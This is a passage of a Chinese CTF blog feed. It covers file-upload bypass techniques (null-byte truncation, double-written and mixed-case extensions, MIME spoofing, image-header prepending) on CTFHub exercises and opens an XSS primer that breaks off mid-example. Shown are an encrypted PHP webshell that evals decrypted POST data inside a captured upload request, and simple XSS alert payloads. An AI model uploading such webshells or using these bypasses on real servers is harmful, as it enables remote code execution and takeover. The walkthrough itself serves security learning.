alt="2671bae349c3b99667fdab4ac7d326ea"></p>              </div>            </details><p>由于使用<code>00</code>截断，所以最后文件保存在<code>/var/www/html/upload</code>,名为<code>test.php</code>,根据位置，访问<code>/upload/test.php</code>,即进入我们所在的页面，可以看到PHP的配置信息，<code>00</code>截断成功</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240311000048915.png" alt="image-20240311000048915"></p>              </div>            </details><h3 id="例题：-2"><a href="#例题：-2" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-00截断</strong></p><p>查看页面源代码发现后端的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="variable">$info</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$des</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型不匹配&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抓包，修改GET参数为<code>?road=/var/www/html/upload/shell.php%00</code>，使用<code>00</code>截断，在传入文件的内容替换成需要执行的代码，如一句话等</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/f78ac8eccde754e43869718de37e0d80.png" alt="f78ac8eccde754e43869718de37e0d80"></p>              </div>            </details><p>然后使用蚁剑连接进入，可以看到我们是成功使用<code>00</code>截断写入的shell.php</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240310194757813.png" alt="image-20240310194757813"></p>              </div>            </details><h1 id="后端检测-修改绕过"><a href="#后端检测-修改绕过" class="headerlink" title="后端检测-修改绕过"></a>后端检测-修改绕过</h1><blockquote><p>通过抓包我们发送的请求，修改请求包中的部分内容，如修改文件名(黑名单双写，大小写替换)，MIME，添加文件头等等操作，使之上传的木马符合后端的要求，使之成功上传。</p></blockquote><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><h3 id="双写绕过原理"><a href="#双写绕过原理" class="headerlink" title="双写绕过原理"></a>双写绕过原理</h3><p>有时候在检测时，后台会把敏感字符删除，这个时候，可以使用双写进行绕过。比如：将<code>.php</code>改写为<code>.pphphp</code></p><p>后端的代码类似为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$name</span>); <span class="comment">//str_ireplace() 函数替换字符串中的一些字符（不区分大小写）</span></span><br></pre></td></tr></table></figure><h3 id="例题：-3"><a href="#例题：-3" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-双写后缀</strong></p><p>查看页面源码，发现这样一段内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);</span><br><span class="line">$name = str_ireplace($blacklist, &quot;&quot;, $name);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这时候上传<code>shell</code>文件，并抓包，将后缀名<code>.php</code>改写为<code>.pphphp</code>，再发包最后成功上传</p><h2 id="大小写后缀绕过"><a href="#大小写后缀绕过" class="headerlink" title="大小写后缀绕过"></a>大小写后缀绕过</h2><h3 id="大小写后缀绕过-1"><a href="#大小写后缀绕过-1" class="headerlink" title="大小写后缀绕过"></a>大小写后缀绕过</h3><p>后端在检测时，后台会检测敏感字符，如果并没有不区分大小写时，可以使用大小写进行绕过。比如：将<code>.php</code>改写为<code>.pHp</code></p><p>后端的代码类似为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\b(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$blacklist</span>) . <span class="string">&#x27;)\b/&#x27;</span>; <span class="comment">//区分大小写</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="MIME检测绕过"><a href="#MIME检测绕过" class="headerlink" title="MIME检测绕过"></a>MIME检测绕过</h2><h3 id="MIME简介"><a href="#MIME简介" class="headerlink" title="MIME简介"></a>MIME简介</h3><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL。部分Web应用系统判定文件类型是通过<code>content-type字段</code>，截取一个请求信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 930</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;echo.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;wells&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz--</span><br></pre></td></tr></table></figure><p>其中<code>Content-Type: application/octet-stream</code>和就是描述了上传文件的MIME 类型</p><h3 id="MIME绕过方法"><a href="#MIME绕过方法" class="headerlink" title="MIME绕过方法"></a>MIME绕过方法</h3><p>部分Web应用系统判定文件类型是通过<code>content-type字段</code>，因此可以通过抓包，将<code>content-type字段</code>改为常见的<code>图片类型</code>，如<code>image/gif</code>，从而绕过校验。</p><h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型:"></a>常见的MIME类型:</h3><p><code>text/plain</code> （纯文本）  <code>text/html</code> （HTML文档）  <code>text/javascript</code> （js代码）  <code>application/xhtml+xml</code> （XHTML文档）  <code>image/gif</code> （GIF图像）  <code>image/jpeg</code> （JPEG图像）  <code>image/png</code> （PNG图像）  <code>video/mpeg</code> （MPEG动画）  <code>application/octet-stream</code> （二进制数据）  <code>application/pdf</code> （PDF文档）</p><h3 id="例题：-4"><a href="#例题：-4" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-MIME绕过</strong></p><p>尝试直接上传<code>.htaccess</code>和<code>php</code>shell文件时都上传失败，尝试修改MIME类型，抓包原始请求头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 930</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">    $key=&quot;7dad18e6e49e447a&quot;;</span><br><span class="line">$_SESSION[&#x27;k&#x27;]=$key;</span><br><span class="line">session_write_close();</span><br><span class="line">$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">$post=$t($post.&quot;&quot;);</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">     $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">&#125;</span><br><span class="line">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz--</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary4BffHh31AMlHQtBd</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary4BffHh31AMlHQtBd</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br></pre></td></tr></table></figure><p>再放行，最后发现<code>shell.php</code>被成功上传，访问<code>upload/shell.php</code>，无内容显示，说明<code>.txt</code>文件被作为php脚本执行成功，使用冰蝎连接</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240305205615030.png" alt="image-20240305205615030"></p>              </div>            </details><p>成功获取<code>phpinfo</code>页面，连接成功，读取flag</p><h2 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h2><h3 id="文件头检测绕过简介"><a href="#文件头检测绕过简介" class="headerlink" title="文件头检测绕过简介"></a>文件头检测绕过简介</h3><p>文件头是在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）的一段数据，用于描述文件的属性和格式信息， 在进行<strong>文件头绕过</strong>时，我们可以把图片的<strong>文件头</strong>添加到我们的木马内容最前面，达到绕过文件头检测的目的。</p><h3 id="常见的文件头"><a href="#常见的文件头" class="headerlink" title="常见的文件头"></a>常见的文件头</h3><p><strong>注意：文本形式请点击复制，不要做任何修改</strong></p><p> GIF：</p><p>16进制模式：<code>47 49 46 38 39 61</code></p><p>对应文本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure><p> png：</p><p>16进制模式：<code>89 50 4E 47 0D 0A 1A 0A</code> </p><p>对应文本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‰PNG</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>JPG：</p><p>16进制模式：<code>FF D8 FF E0 00 10 4A 46 49 46 </code>   </p><p>对应文本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ÿØÿà</span><br></pre></td></tr></table></figure><h3 id="文件头检测绕过条件"><a href="#文件头检测绕过条件" class="headerlink" title="文件头检测绕过条件"></a>文件头检测绕过条件</h3><ul><li>某些情况下，后端可能还会检测文件拓展名，此时需要结合<strong>解析漏洞</strong>或者<strong>文件包含</strong>才能实现执行木马</li></ul><h3 id="例题：-5"><a href="#例题：-5" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-文件头检查</strong></p><p>步骤一：直接选择木马文件进行上传，然后进行抓包</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240311194544976.png" alt="image-20240311194544976"></p><p><img src="/./file-upload/image-20240311194902164.png" alt="image-20240311194902164"></p>              </div>            </details><p><strong>以添加PNG请求头为例</strong></p><p>方法一：在PHP代码前添加入任意八个字母，用于定位以及替换为PNG的文件头，后转HEX模式替换为PNG的文件头</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/75033ba79ccf8f01e779c986126eab6d.png" alt="75033ba79ccf8f01e779c986126eab6d"></p>              </div>            </details><p>方法二：直接在PHP代码后插入PNG文件头对应的文本表示符号</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/d27ef6d3293e7bd2c81eb69580af1915.png" alt="d27ef6d3293e7bd2c81eb69580af1915"></p>              </div>            </details><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><p>参考腾讯云开发者社区博主「网络安全自修室」的文章</p><p>原文链接：<a href="https://cloud.tencent.com/developer/article/1938541">超详细文件上传漏洞总结分析-腾讯云开发者社区-腾讯云 (tencent.com)</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;h3 id=&quot;什么是文件上传漏洞&quot;&gt;&lt;a href=&quot;#什么是文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;什么是文件上传</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-FileUpload" scheme="https://we11s.github.io/tags/Web-FileUpload/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞-入门</title>
    <link href="https://we11s.github.io/posts/2255213327/"/>
    <id>https://we11s.github.io/posts/2255213327/</id>
    <published>2024-02-18T12:29:15.000Z</published>
    <updated>2024-03-12T16:45:04.765Z</updated>
    
    <content type="html"><![CDATA[<h1 id="施工中"><a href="#施工中" class="headerlink" title="施工中"></a>施工中</h1><p><img src="/img/edit.png" alt="施工中"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;施工中&quot;&gt;&lt;a href=&quot;#施工中&quot; class=&quot;headerlink&quot; title=&quot;施工中&quot;&gt;&lt;/a&gt;施工中&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/img/edit.png&quot; alt=&quot;施工中&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-Unserialize" scheme="https://we11s.github.io/tags/Web-Unserialize/"/>
    
  </entry>
  
  <entry>
    <title>XSS-基础篇</title>
    <link href="https://we11s.github.io/posts/508713684/"/>
    <id>https://we11s.github.io/posts/508713684/</id>
    <published>2024-02-18T12:27:38.000Z</published>
    <updated>2024-05-29T17:53:39.467Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS简介："><a href="#XSS简介：" class="headerlink" title="XSS简介："></a>XSS简介：</h1><p>动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。跨站脚本攻击允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容</p><h2 id="XSS的分类："><a href="#XSS的分类：" class="headerlink" title="XSS的分类："></a>XSS的分类：</h2><h3 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型(非持久化)"></a>1、反射型(非持久化)</h3><p>​(1)<strong>原理</strong></p><p>​反射型xss又称非持久型xss。发出请求时，此类XSS代码出现在URL中，作为输入提交到服务器端，XSS代码被服务器端解析后传回给浏览器，后解析执行XSS代码。</p><p>​(2)<strong>攻击方式</strong></p><p>​攻击者将包含xss代码的恶意链接发送给目标用户。当其他用户访问该链接时，服务器接受该用户的URL中参数的请求并进行处理，后xss代码被服务器发送给其他用户的浏览器，触发xss漏洞</p><h3 id="2、存储型-持久化"><a href="#2、存储型-持久化" class="headerlink" title="2、存储型(持久化)"></a>2、存储型(持久化)</h3><p>​(1)<strong>原理</strong></p><p>​存储型XSS，提交的代码会存储在服务器端，其他用户请求该页面时会触发xss漏洞，无需访问攻击者的特定链接。例如：留言板中的XSS，用户提交一条包含XSS代码的留言存储到数据库，其他用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击</p><p>​(2)<strong>攻击方式</strong></p><p>​攻击者将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，页面进行解析后响应，最后浏览器解析执行XSS代码，触发xss漏洞</p><h3 id="3、DOM-based型"><a href="#3、DOM-based型" class="headerlink" title="3、DOM-based型"></a>3、DOM-based型</h3><blockquote><p>文档对象模型（DOM）是一个网络文档的编程接口。它代表页面，以便程序可以改变文档的结构、风格和内容。DOM 将文档表示为节点和对象；这样，编程语言就可以与页面交互。</p></blockquote><p>​(1)<strong>原理</strong></p><p>​DOM型xss其实是一种特殊类型的反射型xss，与反射型类似此类XSS代码出现在URL中，但DOM XSS和反射型XSS的区别在于DOM XSS代码并不需要服务器参与，依靠客户端进行解析。</p><p>​(2)<strong>攻击方式</strong></p><p>​与反射型类似，当其他用户访问该链接时，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞</p><h2 id="XSS代码插入位置"><a href="#XSS代码插入位置" class="headerlink" title="XSS代码插入位置"></a>XSS代码插入位置</h2><h3 id="1-插入到HTML注释内容中"><a href="#1-插入到HTML注释内容中" class="headerlink" title="1.插入到HTML注释内容中"></a>1.插入到HTML注释内容中</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">&lt;script&gt;  alert(&#x27;XSS&#x27;);&lt;/script&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-插入到HTML标签的属性值中"><a href="#2-插入到HTML标签的属性值中" class="headerlink" title="2.插入到HTML标签的属性值中"></a>2.插入到HTML标签的属性值中</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image,png&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注：<code>onerror</code>属性是HTML中<code>&lt;img&gt;</code>标签的一个事件属性，它用于定义当图像加载失败时执行的JavaScript代码。</p><h3 id="3-插入到HTML标签的属性名中"><a href="#3-插入到HTML标签的属性名中" class="headerlink" title="3.插入到HTML标签的属性名中"></a>3.插入到HTML标签的属性名中</h3><p>使用语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>构造闭合，可得到以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用构造闭合的方式将恶意代码插入到某个标签中，将恶意代码插入到了标签中的属性值中，实现XSS攻击</p><h3 id="4-插入到HTML标签名中"><a href="#4-插入到HTML标签名中" class="headerlink" title="4.插入到HTML标签名中"></a>4.插入到HTML标签名中</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; <span 